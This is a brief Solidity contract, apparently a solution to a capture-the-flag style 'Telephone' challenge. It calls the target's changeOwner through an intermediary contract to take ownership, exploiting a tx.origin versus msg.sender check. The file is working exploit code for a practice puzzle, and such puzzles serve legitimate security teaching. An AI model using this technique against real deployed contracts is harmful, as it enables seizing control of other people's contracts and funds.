pragma solidity ^0.6.0;

import './Telephone.sol';

contract TeleHack{

    Telephone public phone;

    constructor(address _phoneAddr) public {
        phone = Telephone(_phoneAddr);
    }

    function takeOwnership(address _owner) public {
        phone.changeOwner(_owner); 
    }
}